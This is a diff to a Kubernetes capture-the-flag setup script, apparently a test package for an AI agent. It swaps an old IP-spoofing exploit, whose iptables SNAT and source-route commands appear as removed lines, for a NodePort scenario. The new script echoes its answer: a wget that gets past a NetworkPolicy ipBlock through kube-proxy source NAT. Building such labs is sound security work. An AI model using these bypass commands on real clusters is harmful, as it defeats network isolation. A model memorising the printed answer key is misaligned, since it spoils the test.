@@ -10,23 +10,27 @@ k8s_create_cluster
 k8s_wait_ready
 k8s_write_node_flag /host-flag
 k8s_install_calico
-
 k8s_load_images alpine:latest nicolaka/netshoot:latest
 
-k8s_apply << 'YAML'
+# 白名单只信任"节点自身地址"，先钉一个 worker 作为验证节点
+WORKER_NODES=$(kubectl get nodes -l '!node-role.kubernetes.io/control-plane' -o name)
+ACCESS_NODE=$(echo "$WORKER_NODES" | head -1)
+kubectl label "$ACCESS_NODE" cni-access=true --overwrite >/dev/null
+NODE_IP=$(kubectl get "$ACCESS_NODE" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
+echo "[K8S-30] access node: ${ACCESS_NODE} (${NODE_IP})"
+
+k8s_apply << YAML
 apiVersion: v1
 kind: Namespace
 metadata:
   name: trust-zone
-  labels:
-    cni: calico
 ---
 apiVersion: v1
 kind: Namespace
 metadata:
   name: untrust-zone
 ---
-# Flag pod in trust-zone, accessible only from specific pod IPs
+# flag 服务：只提供 /flag，进站策略只放行"节点地址"
 apiVersion: v1
 kind: Pod
 metadata:
@@ -42,9 +46,9 @@ spec:
       command: ["sh", "-c"]
       args:
         - |
-          echo "FLAG_PLACEHOLDER" > /flag.txt
+          printf 'flag{placeholder}\n' > /flag.txt
           while true; do
-            printf "HTTP/1.1 200 OK\r\n\r\n$(cat /flag.txt)" | nc -l -p 8080 -w 1
+            printf "HTTP/1.1 200 OK\r\n\r\n\$(cat /flag.txt)" | nc -l -p 8080 -w 1
           done
       ports:
         - containerPort: 8080
@@ -55,12 +59,15 @@ metadata:
   name: flag-svc
   namespace: trust-zone
 spec:
+  type: NodePort
   selector:
     app: flag-pod
   ports:
     - port: 8080
+      targetPort: 8080
+      nodePort: 30808
 ---
-# NetworkPolicy allowing only specific IP blocks (10.244.1.0/24)
+# ipBlock 白名单只信任节点自身这一个 /32 地址
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
 metadata:
@@ -75,11 +82,11 @@ spec:
   ingress:
     - from:
         - ipBlock:
-            cidr: "10.244.1.0/24"
+            cidr: "${NODE_IP}/32"
       ports:
         - port: 8080
 ---
-# Attacker pod in untrust-zone (different IP range)
+# 落脚 pod：钉在上述节点上，自报节点地址
 apiVersion: v1
 kind: Pod
 metadata:
@@ -88,55 +95,37 @@ metadata:
   labels:
     app: attacker
 spec:
+  nodeSelector:
+    cni-access: "true"
   containers:
     - name: attacker
       image: nicolaka/netshoot:latest
       imagePullPolicy: IfNotPresent
       command: ["sleep", "3600"]
+      env:
+        - name: NODE_IP
+          valueFrom:
+            fieldRef:
+              fieldPath: status.hostIP
       securityContext:
         runAsUser: 0
         capabilities:
           add:
             - NET_ADMIN
----
-# Allowed pod in trust-zone (whitelisted IP)
-apiVersion: v1
-kind: Pod
-metadata:
-  name: trusted-pod
-  namespace: trust-zone
-spec:
-  containers:
-    - name: app
-      image: alpine:latest
-      imagePullPolicy: IfNotPresent
-      command: ["sleep", "3600"]
 YAML
 
 k8s_wait_pod "flag-pod" "trust-zone"
 k8s_wait_pod "attacker-pod" "untrust-zone"
-k8s_wait_pod "trusted-pod" "trust-zone"
 sleep 5
 
-FLAG_IP=$(kubectl get svc flag-svc -n trust-zone -o jsonpath='{.spec.clusterIP}')
-TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}')
-kubectl exec -n trust-zone flag-pod -- sh -c "echo '$FLAG' > /flag.txt" 2>/dev/null || true
+kubectl exec -n trust-zone flag-pod -- sh -c "printf '%s\n' '$FLAG' > /flag.txt"
 
-k8s_publish_agent_identity pods-executor untrust-zone
+k8s_publish_agent_identity exec-only untrust-zone attacker-pod
 k8s_info
-echo "    Flag in: flag-pod (trust-zone, IP-restricted)"
-echo "    Allowed IP: $TRUSTED_IP"
-echo "    Flag service: flag-svc.trust-zone.svc.cluster.local:8080"
+echo "    Flag in: flag-pod (trust-zone)，NetworkPolicy 只放行 ipBlock ${NODE_IP}/32"
+echo "    Flag service: NodePort 30808（经节点地址可达）"
 echo ""
-echo "    Exploit: Spoof the trusted pod's source IP to bypass the ipBlock policy"
-echo "    (attacker pod is misconfigured with CAP_NET_ADMIN - the real finding)"
-echo "    1. SNAT to the trusted IP (iptables available via netshoot):"
-echo "       kubectl exec -n untrust-zone attacker-pod -- iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source $TRUSTED_IP"
-echo "       kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
-echo "    2. Alternative - secondary IP + source-route selection:"
-echo "       kubectl exec -n untrust-zone attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0"
-echo "       kubectl exec -n untrust-zone attacker-pod -- ip route add ${FLAG_IP}/32 dev eth0 src $TRUSTED_IP"
-echo "       kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080"
-echo ""
-echo "    Note: NetworkPolicy ipBlock trusts the source IP; CAP_NET_ADMIN lets the"
-echo "    pod rewrite it. This is a pod capability misconfiguration."
+echo "    Exploit（在落脚 pod 内执行）："
+echo "      wget -qO- http://\$NODE_IP:30808/flag"
+echo "    ipBlock 白名单只看源地址，而 NodePort 的出口 NAT（kube-proxy 的 KUBE-MARK-MASQ）"
+echo "    会把 Pod 的源地址改写成节点地址，于是任意 Pod 都能借节点身份穿过这条策略。"
